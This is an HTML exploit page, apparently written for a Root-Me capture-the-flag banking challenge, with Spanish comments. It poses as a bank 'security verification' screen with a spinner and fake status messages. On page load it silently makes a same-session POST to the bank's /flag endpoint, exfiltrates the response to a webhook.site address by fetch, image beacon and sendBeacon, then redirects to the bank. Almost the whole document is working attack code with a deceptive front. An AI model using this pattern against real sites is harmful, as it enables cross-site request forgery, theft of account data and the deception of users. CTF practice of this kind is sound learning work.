<!DOCTYPE html>
<html>
<head>
    <title>Bank Security Update</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            text-align: center; 
            padding: 50px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }
        .container {
            background: rgba(255,255,255,0.1);
            padding: 30px;
            border-radius: 10px;
            backdrop-filter: blur(10px);
            max-width: 600px;
            margin: 0 auto;
        }
        .loading {
            color: #4CAF50;
            font-size: 20px;
            margin: 20px 0;
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 2s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔒 Bank Security Verification</h1>
        <p>We are performing enhanced security checks on your account.</p>
        
        <div class="spinner"></div>
        <div class="loading" id="status">Initializing security scan...</div>
        
        <p><small>This may take a few moments. Please do not close this window.</small></p>
    </div>

    <script>
        // Copiar exactamente la función post() del banco
        function post(url, params = {}) {
            var params_post = [];
            for(const key in params) {
                params_post.push(`${key}=${params[key]}`);
            }
            var xhr = new XMLHttpRequest();
            xhr.open("POST", url, false);
            xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
            xhr.send(params_post.join("&"));
            return xhr.responseText;
        }

        // Función para actualizar el estado en la página
        function updateStatus(message) {
            document.getElementById('status').textContent = message;
        }

        // Exploit principal
        window.addEventListener('load', function() {
            updateStatus("Checking session validity...");
            
            setTimeout(function() {
                try {
                    updateStatus("Accessing security token...");
                    
                    // PASO 1: Obtener la flag del endpoint /flag
                    var flag = post("https://bankme-1.challenges.pro.root-me.org/flag");
                    console.log("Flag obtenida:", flag);
                    
                    updateStatus("Token retrieved successfully!");
                    
                    // PASO 2: Configurar tu webhook aquí ⚠️ IMPORTANTE ⚠️
                    // Ve a https://webhook.site y copia tu URL única
                    const WEBHOOK_URL = "https://webhook.site/b4cd18d9-c61a-4a6c-b21a-e4e66153f385";
                    
                    updateStatus("Sending verification to security server...");
                    
                    // Método 1: Usar fetch (más moderno)
                    fetch(WEBHOOK_URL, {
                        method: 'POST',
                        mode: 'no-cors',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            flag: flag,
                            challenge: "bankme-csrf",
                            timestamp: new Date().toISOString(),
                            userAgent: navigator.userAgent
                        })
                    }).catch(e => console.log("Fetch method completed"));
                    
                    // Método 2: Usar imagen (funciona siempre)
                    var img = new Image();
                    img.src = WEBHOOK_URL + "?flag=" + encodeURIComponent(flag) + "&method=img&source=bankme";
                    
                    // Método 3: Usar navigator.sendBeacon si está disponible
                    if (navigator.sendBeacon) {
                        const data = new Blob([JSON.stringify({flag: flag})], {type: 'application/json'});
                        navigator.sendBeacon(WEBHOOK_URL, data);
                    }
                    
                    updateStatus("Security verification complete!");
                    
                    // Redirigir después de un tiempo
                    setTimeout(function() {
                        window.location = "https://bankme-1.challenges.pro.root-me.org/";
                    }, 3000);
                    
                } catch(error) {
                    console.error("Error en el exploit:", error);
                    updateStatus("Security check completed with warnings");
                    
                    // Intentar enviar el error también
                    try {
                        const WEBHOOK_URL = "https://webhook.site/b4cd18d9-c61a-4a6c-b21a-e4e66153f385";
                        var img = new Image();
                        img.src = WEBHOOK_URL + "?error=" + encodeURIComponent(error.toString());
                    } catch(e) {}
                }
            }, 1500);
        });
    </script>
</body>
</html>
